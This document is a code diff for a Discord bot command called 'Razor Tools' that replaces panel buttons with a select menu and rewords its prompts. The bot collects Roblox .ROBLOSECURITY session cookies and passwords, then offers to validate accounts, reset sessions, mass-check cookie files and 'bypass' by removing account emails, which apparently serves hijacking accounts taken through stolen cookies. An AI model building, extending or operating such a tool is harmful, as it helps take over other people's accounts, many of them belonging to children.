@@ -1,8 +1,8 @@
 import {
   SlashCommandBuilder,
   ActionRowBuilder,
-  ButtonBuilder,
-  ButtonStyle,
+  StringSelectMenuBuilder,
+  StringSelectMenuOptionBuilder,
   ModalBuilder,
   TextInputBuilder,
   TextInputStyle,
@@ -23,7 +23,6 @@ import {
   buildBaseEmbed,
 } from '../../lib/embed-helpers';
 import { buildCopyButtons } from '../../lib/button-helpers';
-import { EMOJIS } from '../../lib/emoji';
 import { logger } from '../../lib/logger';
 
 const modalSessions = new Map<string, { action: string }>();
@@ -33,9 +32,9 @@ function buildPanelEmbed() {
     '𖣐 Razor Tools Serving',
     '✧ **Welcome to Razor Tools**\n' +
     '────\n' +
-    '⭑ Select an action below.\n' +
-    '⭑ You will be asked for credentials and delivery method.\n' +
-    '⭑ Results can be sent via DM or posted in this channel.\n' +
+    '⭑ Select!\n' +
+    '⭑ No Question Further.\n' +
+    '⭑ Results In DM | Server\n' +
     '────\n' +
     '✧ **Commands:**\n' +
     '• Login – Check Account Info\n' +
@@ -47,48 +46,53 @@ function buildPanelEmbed() {
   );
 }
 
-function buildPanelComponents() {
-  const row1 = new ActionRowBuilder<ButtonBuilder>();
-  const row2 = new ActionRowBuilder<ButtonBuilder>();
-  const actions = [
-    { id: 'login', label: '🔐 Login / Check' },
-    { id: 'reset', label: '🔄 Reset Session' },
-    { id: 'bypass', label: '⚡ Bypass' },
-    { id: 'check', label: '📂 Mass Check' },
-    { id: 'clear', label: '🧹 Clear Cookie' },
-  ];
-  actions.forEach((a, i) => {
-    const btn = new ButtonBuilder()
-      .setCustomId(`panel_${a.id}`)
-      .setLabel(a.label)
-      .setStyle(ButtonStyle.Primary);
-    if (i < 3) row1.addComponents(btn);
-    else row2.addComponents(btn);
-  });
-  return [row1, row2];
+function buildPanelSelect() {
+  const select = new StringSelectMenuBuilder()
+    .setCustomId('panel_select')
+    .setPlaceholder('Choose an action')
+    .addOptions(
+      new StringSelectMenuOptionBuilder()
+        .setLabel('🔐 Login / Check')
+        .setValue('login')
+        .setDescription('Validate and show account info'),
+      new StringSelectMenuOptionBuilder()
+        .setLabel('🔄 Reset Session')
+        .setValue('reset')
+        .setDescription('Kill Sessions & Get Fresh One'),
+      new StringSelectMenuOptionBuilder()
+        .setLabel('⚡ Bypass')
+        .setValue('bypass')
+        .setDescription('Attempt Emails Removing'),
+      new StringSelectMenuOptionBuilder()
+        .setLabel('📂 Mass Check')
+        .setValue('check')
+        .setDescription('Checks Files Of Cookies'),
+      new StringSelectMenuOptionBuilder()
+        .setLabel('🧹 Clear Cookie')
+        .setValue('clear')
+        .setDescription('Clear Cookies Format')
+    );
+  return new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
 }
 
 const data = new SlashCommandBuilder()
   .setName('panel')
-  .setDescription('Open the Razor Tools control panel')
+  .setDescription('Razor Tools Serving..')
   .setDefaultMemberPermissions('0') as SlashCommandBuilder;
 
 async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
   await interaction.reply({
     embeds: [buildPanelEmbed()],
-    components: buildPanelComponents(),
+    components: [buildPanelSelect()],
   });
 }
 
-async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
-  const customId = interaction.customId;
-  const userId = interaction.user.id;
+async function handleSelect(interaction: MessageComponentInteraction): Promise<void> {
+  if (!interaction.isStringSelectMenu()) return;
+  if (interaction.customId !== 'panel_select') return;
 
-  const action = customId.replace('panel_', '');
-  if (!['login', 'reset', 'bypass', 'check', 'clear'].includes(action)) {
-    await interaction.reply({ content: 'Unknown action.', flags: MessageFlags.Ephemeral });
-    return;
-  }
+  const action = interaction.values[0];
+  const userId = interaction.user.id;
 
   if (action === 'check') {
     await interaction.reply({
@@ -104,10 +108,10 @@ async function handleButton(interaction: MessageComponentInteraction): Promise<v
 
   const cookieInput = new TextInputBuilder()
     .setCustomId('cookie')
-    .setLabel('.ROBLOSECURITY Cookie')
+    .setLabel('Insert The Cookies!')
     .setStyle(TextInputStyle.Paragraph)
     .setRequired(true)
-    .setPlaceholder('Paste your cookie (including warning prefix)');
+    .setPlaceholder('Insert here...');
 
   const fields = [cookieInput];
 
@@ -117,17 +121,17 @@ async function handleButton(interaction: MessageComponentInteraction): Promise<v
       .setLabel('Password')
       .setStyle(TextInputStyle.Short)
       .setRequired(true)
-      .setPlaceholder('Enter your Roblox password');
+      .setPlaceholder('Insert here...');
     fields.push(passInput);
   }
 
   const deliveryInput = new TextInputBuilder()
     .setCustomId('delivery')
-    .setLabel('Delivery method (dm or server)')
+    .setLabel('Send To S/D? (S - SERVER | D - DM)')
     .setStyle(TextInputStyle.Short)
     .setRequired(true)
-    .setValue('server')
-    .setPlaceholder('Type "dm" for DM, or "server" for this channel');
+    .setValue('S')
+    .setPlaceholder('S or D');
 
   fields.push(deliveryInput);
 
@@ -159,8 +163,8 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
     }
   }
 
-  const deliveryRaw = interaction.fields.getTextInputValue('delivery').toLowerCase().trim();
-  const delivery = (deliveryRaw === 'dm') ? 'dm' : 'server';
+  const deliveryRaw = interaction.fields.getTextInputValue('delivery').toUpperCase().trim();
+  const delivery = (deliveryRaw === 'D') ? 'dm' : 'server';
 
   await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
@@ -195,10 +199,10 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
         const thumb = await Roblox.fetchAvatarThumbnail(String(validation.userId!));
 
         let emailStatus = 'No email found';
-        if (email.verified) emailStatus = `${EMOJIS.VERIFICATION} Verified: \`${email.verified}\``;
+        if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
         else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
 
-        const parentStatus = parental.hasParent ? `${EMOJIS.VERIFICATION} Parent linked` : '❌ No parent linked';
+        const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';
 
         const embed = buildAccountEmbed(
           validation.username!,
@@ -288,7 +292,9 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
             `────\n` +
             `⭑ Removed warning prefix and extra text.`
           );
-          await sendResult({ embeds: [embed] });
+          const id = Math.random().toString(36).slice(2, 10);
+          const row = buildCopyButtons(id, 'clear', cleaned, delivery === 'dm');
+          await sendResult({ embeds: [embed], components: [row] });
         }
         break;
       }
@@ -303,4 +309,4 @@ async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
   modalSessions.delete(sessionKey);
 }
 
-export const panelCommand: Command = { data, execute, handleButton, handleModal };
+export const panelCommand: Command = { data, execute, handleSelect, handleModal };
